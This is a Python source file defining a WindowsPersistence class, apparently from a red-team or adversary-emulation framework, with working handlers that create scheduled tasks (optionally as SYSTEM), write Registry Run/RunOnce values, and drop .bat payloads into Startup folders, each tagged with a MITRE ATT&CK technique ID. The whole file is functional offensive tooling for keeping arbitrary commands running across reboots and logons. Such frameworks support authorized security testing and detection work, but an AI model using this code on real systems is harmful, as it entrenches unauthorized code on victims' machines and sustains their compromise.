import os
import platform
import subprocess
import win32api # Required for registry access
import win32con # Required for registry access
import shutil # For copying files if needed
import tempfile # For creating temp files
from typing import Dict, Any, Tuple, Optional
import logging # Use standard logging
from datetime import datetime
from pathlib import Path

# Assume logger is passed or configured appropriately
logger = logging.getLogger(__name__)

class WindowsPersistence:
    """Handles Windows-specific persistence techniques."""

    def __init__(self, execute_command_func):
        """
        Initialize WindowsPersistence.

        Args:
            execute_command_func: A callable provided by the main Persistence class
                                  to execute commands (likely wrapping ExecutionModule).
        """
        self._execute_command = execute_command_func
        self.handler_map = {
            "scheduled_task": self._handle_scheduled_task,
            "registry_run_key": self._handle_registry_run_key,
            "startup_folder": self._handle_startup_folder,
            # Add other Windows techniques here
        }

    def establish(self, technique: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using a specific Windows technique."""
        handler = self.handler_map.get(technique)
        if handler:
            logger.info(f"Executing Windows persistence technique: {technique}")
            try:
                return handler(details)
            except Exception as e:
                logger.error(f"Error executing Windows persistence technique '{technique}': {e}", exc_info=True)
                return {"status": "failure", "technique": technique, "reason": str(e)}
        else:
            logger.warning(f"Unsupported Windows persistence technique requested: {technique}")
            return {"status": "failure", "technique": technique, "reason": "Unsupported technique for Windows"}

    # --- Technique Handlers ---

    def _handle_scheduled_task(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Add or remove Windows Scheduled Tasks using schtasks.exe."""
        action = details.get("action", "add").lower()
        task_name = details.get("task_name")
        command_to_execute = details.get("command")
        trigger = details.get("trigger", "ONLOGON").upper() # ONLOGON, ONSTART, MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONIDLE
        modifier = details.get("modifier") # e.g., 5 for MINUTE trigger (every 5 mins)
        start_time = details.get("start_time") # HH:mm format
        run_as_user = details.get("user", "CURRENT") # CURRENT (runs as process user), SYSTEM, or specific username
        run_as_password = details.get("password") # Password for specific user - HIGHLY INSECURE, AVOID IF POSSIBLE
        run_level = details.get("run_level", "HIGHEST").upper() # HIGHEST or LIMITED
        force = details.get("force", False) # /F flag for create/delete
        description = details.get("description", "BlueFire Persistence Task")

        mitre_id = "T1053.005"
        mitre_name = "Scheduled Task/Job: Scheduled Task"

        if not task_name:
            return {"status": "failure", "technique": "scheduled_task", "reason": "Missing 'task_name' in details.", "mitre_id": mitre_id}

        if action not in ["add", "remove"]:
            return {"status": "failure", "technique": "scheduled_task", "reason": f"Invalid action: {action}. Use 'add' or 'remove'.", "mitre_id": mitre_id}

        if action == "add" and not command_to_execute:
             return {"status": "failure", "technique": "scheduled_task", "reason": "Missing 'command' detail for adding task.", "mitre_id": mitre_id}

        cmd_parts = ["schtasks"]
        final_command_str = ""
        exec_method = "direct" # schtasks is usually direct

        try:
            if action == "add":
                logger.info(f"Attempting to create scheduled task: {task_name}")
                cmd_parts.extend(["/create", "/tn", f'"{task_name}"']) # Quote task name
                cmd_parts.extend(["/tr", f'\"{command_to_execute.replace("\\", "\\\\")}\"']) # Quote and escape backslashes in command
                cmd_parts.extend(["/sc", trigger])
                if modifier and trigger in ["MINUTE", "HOURLY", "DAILY", "WEEKLY", "MONTHLY"]:
                     cmd_parts.extend(["/mo", str(modifier)])
                if start_time and trigger in ["DAILY", "WEEKLY", "MONTHLY"]:
                    cmd_parts.extend(["/st", start_time])
                if run_as_user and run_as_user.upper() == "SYSTEM":
                     cmd_parts.extend(["/ru", "SYSTEM"])
                elif run_as_user and run_as_user.upper() != "CURRENT": # Specific user
                     cmd_parts.extend(["/ru", f'"{run_as_user}"']) # Quote username
                     if run_as_password:
                          logger.warning(f"Using password for task '{task_name}' - this is insecure.")
                          cmd_parts.extend(["/rp", f'"{run_as_password}"']) # Quote password
                     else:
                          logger.warning(f"Running task '{task_name}' as specific user '{run_as_user}' without password. Task may fail if password required.")
                          # schtasks might prompt if password needed and not provided
                # Run Level (/RL)
                if run_level in ["HIGHEST", "LIMITED"]:
                    cmd_parts.extend(["/rl", run_level])
                else:
                    logger.warning(f"Invalid run_level '{run_level}', defaulting to not specifying RL.")
                
                # Force flag (/F)
                if force: cmd_parts.append("/f")
                
                # Description (/D) - Add description safely if provided
                if description:
                     cmd_parts.extend(["/d", f'"{description}"']) # Quote description
                
                final_command_str = " ".join(cmd_parts)

            elif action == "remove":
                logger.info(f"Attempting to remove scheduled task: {task_name}")
                cmd_parts.extend(["/delete", "/tn", f'"{task_name}"']) # Quote task name
                if force: cmd_parts.append("/f")
                final_command_str = " ".join(cmd_parts)

        except Exception as build_err:
             return {"status": "error", "reason": f"Error building schtasks command: {build_err}", "mitre_id": mitre_id}

        status = "failure"
        reason = ""
        exec_details = {}

        try:
            logger.debug(f"Executing schtasks command: {final_command_str}")
            exec_result = self._execute_command(final_command_str, capture_output=True)
            
            exec_details = {
                 "command_executed": final_command_str,
                 "output": exec_result.get('output', ''),
                 "error": exec_result.get('error', ''),
                 "return_code": exec_result.get('return_code')
            }

            # Check return code and common error messages
            rc = exec_details["return_code"]
            stderr = exec_details["error"]
            stdout = exec_details["output"]
            
            if rc == 0:
                logger.info(f"Scheduled task '{task_name}' {action} successful.")
                status = "success"
            else:
                reason = f"schtasks failed with return code {rc}."
                logger.error(f"Failed to {action} scheduled task '{task_name}'. RC: {rc}")
                logger.error(f"STDOUT: {stdout}")
                logger.error(f"STDERR: {stderr}")
                # Provide more specific reasons based on output/error
                if "ERROR: Access is denied" in stderr or "ERROR: Access is denied" in stdout:
                     reason += " Access Denied (requires elevation)."
                elif "ERROR: The system cannot find the file specified" in stderr and action == "remove":
                     reason += f" Task '{task_name}' not found for removal."
                elif "WARNING: The task name" in stderr and "already exists" in stderr and action == "add" and not force:
                     reason += f" Task '{task_name}' already exists (use force=True to overwrite)."
                     # Consider making this a success/skipped?
                     status = "skipped" # Task exists, not an error if force=False
                else:
                     # General error message combining outputs
                     err_summary = (stderr or stdout or "Unknown error").strip()
                     reason += f" Error: {err_summary[:200]}..."

        except Exception as e:
            logger.error(f"Exception during schtasks execution for '{task_name}': {e}", exc_info=True)
            reason = f"Internal execution error: {str(e)}"
            exec_details["internal_error"] = reason

        return {
            "status": status,
            "technique": "scheduled_task",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": {
                 "action": action,
            "task_name": task_name,
                 "command_attempted": command_to_execute if action == "add" else None,
                 "trigger": trigger if action == "add" else None,
                 "execution_details": exec_details
            },
            "reason": reason if status != "success" else None
        }

    def _handle_registry_run_key(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Add or remove Windows Registry Run/RunOnce keys."""
        action = details.get("action", "add").lower() # add | remove
        value_name = details.get("value_name")
        command = details.get("command") # Required for add
        hive_str = details.get("hive", "HKCU").upper() # HKCU or HKLM
        key_type = details.get("key_type", "Run") # Run, RunOnce
        # Force is only relevant for 'add' action if value exists
        force_overwrite = details.get("force", False) if action == "add" else False

        mitre_id = "T1547.001"
        mitre_name = "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"

        # Input Validation
        if not value_name:
             return {"status": "failure", "technique": "registry_run_key", "reason": "Missing required 'value_name' detail.", "mitre_id": mitre_id}
        if action not in ["add", "remove"]:
            return {"status": "failure", "technique": "registry_run_key", "reason": f"Invalid action: {action}. Use 'add' or 'remove'.", "mitre_id": mitre_id}
        if action == "add" and not command:
            return {"status": "failure", "technique": "registry_run_key", "reason": "Missing required 'command' detail for adding registry key.", "mitre_id": mitre_id}

        # Validate hive and key_type
        valid_hives = {"HKCU": win32con.HKEY_CURRENT_USER, "HKLM": win32con.HKEY_LOCAL_MACHINE}
        valid_key_types = ["Run", "RunOnce"]
        if hive_str not in valid_hives:
             return {"status": "failure", "technique": "registry_run_key", "reason": f"Invalid hive: {hive_str}. Use HKCU or HKLM.", "mitre_id": mitre_id}
        if key_type not in valid_key_types:
             return {"status": "failure", "technique": "registry_run_key", "reason": f"Invalid key_type: {key_type}. Use Run or RunOnce.", "mitre_id": mitre_id}

        hive = valid_hives[hive_str]
        base_key_path = f"SOFTWARE\Microsoft\Windows\CurrentVersion\{key_type}"
        full_key_path_str = f"{hive_str}\\{base_key_path}\\{value_name}"

        logger.info(f"Attempting to {action} registry key: {full_key_path_str}")
        if action == "add": logger.debug(f"Registry Command: {command}")

        status = "failure"
        reason = ""
        key_handle = None
        required_access = win32con.KEY_SET_VALUE if action == "add" else win32con.KEY_SET_VALUE # Delete also needs KEY_SET_VALUE
        # Try to open with 64-bit view first, then 32-bit if needed?
        # For simplicity, stick to KEY_WOW64_64KEY for now
        access_flags = required_access | win32con.KEY_WOW64_64KEY 

        try:
            # Using direct win32api for registry modification
            # Requires appropriate permissions (Admin for HKLM)
            if hive_str == "HKLM" and action == "add":
                 logger.warning("Targeting HKLM requires Administrator privileges.")
            elif hive_str == "HKLM" and action == "remove":
                 logger.warning("Removing from HKLM requires Administrator privileges.")

            # Open the base key
            key_handle = win32api.RegOpenKeyEx(hive, base_key_path, 0, access_flags)

            if action == "add":
                # Check if value exists
                value_exists = False
                try:
                    win32api.RegQueryValueEx(key_handle, value_name)
                    value_exists = True
                except win32api.error as query_err:
                    if query_err.winerror == 2: value_exists = False # ERROR_FILE_NOT_FOUND
                    else: raise # Re-raise other query errors
                
                if value_exists and not force_overwrite:
                    reason = f"Registry value '{value_name}' already exists and force=False."
                    logger.warning(reason)
                    status = "skipped" # Value exists, not an error if not forcing
                else:
                    # Set the value (REG_SZ - string)
                    win32api.RegSetValueEx(key_handle, value_name, 0, win32con.REG_SZ, command)
                    verb = "Overwrote" if value_exists else "Set"
                    logger.info(f"Successfully {verb} registry value '{value_name}' in {hive_str}\\{base_key_path}.")
                    status = "success"

            elif action == "remove":
                try:
                    # Attempt to delete the value
                    win32api.RegDeleteValue(key_handle, value_name)
                    logger.info(f"Successfully deleted registry value '{value_name}' from {hive_str}\\{base_key_path}.")
                    status = "success"
                except win32api.error as delete_err:
                    if delete_err.winerror == 2: # ERROR_FILE_NOT_FOUND
                        reason = f"Registry value '{value_name}' not found for removal."
                        logger.warning(reason)
                        status = "skipped" # Not found is not a failure for removal
                    else:
                        raise # Re-raise other deletion errors

        except win32api.error as e:
            # Handle specific Windows errors
            reason = f"Registry API error: {e.strerror} (Code: {e.winerror})"
            logger.error(f"Failed to {action} registry key: {reason}")
            if e.winerror == 5: # Access Denied
                 reason += " (Requires elevation for HKLM or specific permissions)."
                 logger.warning(f"Access Denied for registry operation on {full_key_path_str}. Requires elevation?")
            status = "failure"
        except Exception as e:
            reason = f"Unexpected error during registry {action}: {e}"
            logger.error(reason, exc_info=True)
            status = "failure"
        finally:
            if key_handle:
                try:
                    win32api.RegCloseKey(key_handle)
                except Exception as e_close:
                     logger.warning(f"Error closing registry key handle: {e_close}")

        return {
            "status": status,
            "technique": "registry_run_key",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": {
                "action": action,
            "hive": hive_str,
            "key_path": base_key_path,
            "value_name": value_name,
                "command_processed": command if action == "add" else None,
            },
            "reason": reason if status in ["failure", "error"] else None # Only include reason on actual failure
        }

    def _get_startup_folder(self, scope: str = 'user') -> Optional[str]:
        """Gets the path to the user or common Startup folder."""
        try:
            if scope.lower() == 'user':
                # CSIDL_STARTUP = 7
                folder_id = win32con.CSIDL_STARTUP
            elif scope.lower() == 'system':
                # CSIDL_COMMON_STARTUP = 24
                folder_id = win32con.CSIDL_COMMON_STARTUP
            else:
                logger.error(f"Invalid scope specified for startup folder: {scope}. Use 'user' or 'system'.")
                return None

            # SHGetFolderPath requires pywin32 >= 223
            # Import locally to avoid import error if not available/needed elsewhere
            from win32com.shell import shell, shellcon
            startup_path = shell.SHGetFolderPath(0, folder_id, None, 0)
            if not os.path.isdir(startup_path):
                 logger.warning(f"Startup folder path found but is not a directory: {startup_path}")
                 return None
            return startup_path
        except ImportError:
            logger.error("Could not import 'win32com.shell'. Startup folder path retrieval requires pywin32 extensions.")
            return None
        except Exception as e:
            logger.error(f"Error getting startup folder path (scope: {scope}): {e}", exc_info=True)
            return None

    def _handle_startup_folder(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Add or remove files (e.g., .bat, .lnk) in the Windows Startup folder."""
        # Parameters:
        # - action: "add" (default) or "remove".
        # - command: The command to execute (used for .bat file content if adding).
        # - file_name: The name for the file (e.g., "UpdateCheck.bat"). Required.
        # - scope: 'user' (default) or 'system' (requires elevation).
        # - payload_content: Direct content for the file (overrides command if adding).
        # - force: Overwrite if file_name already exists (relevant for adding, default: False).

        action = details.get("action", "add").lower()
        command = details.get("command")
        file_name = details.get("file_name")
        scope = details.get("scope", "user")
        payload_content = details.get("payload_content")
        force_overwrite = details.get("force", False) if action == "add" else False

        mitre_id = "T1547.001"
        mitre_name = "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"

        # Input Validation
        if not file_name:
            return {"status": "failure", "technique": "startup_folder", "reason": "Missing required 'file_name' detail.", "mitre_id": mitre_id}
        if action not in ["add", "remove"]:
            return {"status": "failure", "technique": "startup_folder", "reason": f"Invalid action: {action}. Use 'add' or 'remove'.", "mitre_id": mitre_id}
        if action == "add" and not command and not payload_content:
            return {"status": "failure", "technique": "startup_folder", "reason": "Missing 'command' or 'payload_content' detail for adding startup file.", "mitre_id": mitre_id}

        # Ensure file name has a reasonable extension if adding (default to .bat)
        # For removal, use the provided name as is.
        if action == "add" and not os.path.splitext(file_name)[1]:
            file_name += ".bat"
            logger.debug(f"No extension provided for add action, defaulting file name to: {file_name}")

        startup_dir_path = self._get_startup_folder(scope)
        if not startup_dir_path:
            return {"status": "failure", "technique": "startup_folder", "reason": f"Could not retrieve {scope} startup folder path.", "mitre_id": mitre_id}
        
        target_file_path = Path(startup_dir_path) / file_name
        logger.info(f"Attempting to {action} startup file: {target_file_path}")

        status = "failure"
        reason = ""
        file_existed = target_file_path.exists()

        try:
            if action == "add":
                if file_existed and not force_overwrite:
                    reason = f"Target file '{target_file_path}' already exists and force=False."
                    logger.warning(reason)
                    status = "skipped"
                else:
                    content_to_write = payload_content if payload_content else f"@echo off\n{command}"
                    logger.debug(f"Writing content to {target_file_path}")
                    # Use write_text for simplicity
                    target_file_path.write_text(content_to_write, encoding='utf-8')
                    # Verify write?
                    if target_file_path.exists():
                        verb = "Overwrote" if file_existed else "Created"
                        logger.info(f"Successfully {verb} startup file: {target_file_path}")
                        status = "success"
                    else:
                         reason = f"File write attempted but target file '{target_file_path}' verification failed."
                         logger.error(reason)

            elif action == "remove":
                if not file_existed:
                    reason = f"Target file '{target_file_path}' not found for removal."
                    logger.warning(reason)
                    status = "skipped" # Not found is not a failure for removal
                else:
                    logger.debug(f"Deleting file: {target_file_path}")
                    target_file_path.unlink()
                    # Verify deletion
                    if not target_file_path.exists():
                        logger.info(f"Successfully deleted startup file: {target_file_path}")
                        status = "success"
                    else:
                         reason = f"File deletion attempted but target file '{target_file_path}' still exists."
                         logger.error(reason)

        except PermissionError as e:
            reason = f"Permission denied during {action} operation on {target_file_path}: {e}"
            logger.error(reason)
            if scope == 'system': reason += " (System scope often requires elevation)."
            status = "failure"
        except Exception as e:
            reason = f"Unexpected error during {action} operation on {target_file_path}: {e}"
            logger.error(reason, exc_info=True)
            status = "failure"

        return {
            "status": status,
            "technique": "startup_folder",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": {
                "action": action,
            "scope": scope,
                "file_name": file_name,
                "target_path": str(target_file_path),
                "command_processed": command if action == "add" and not payload_content else None,
                "payload_content_processed": bool(payload_content) if action == "add" else None,
            },
            "reason": reason if status in ["failure", "error"] else None
        }

    # Add other Windows-specific methods like _handle_startup_folder, _handle_wmi_subscription etc. here 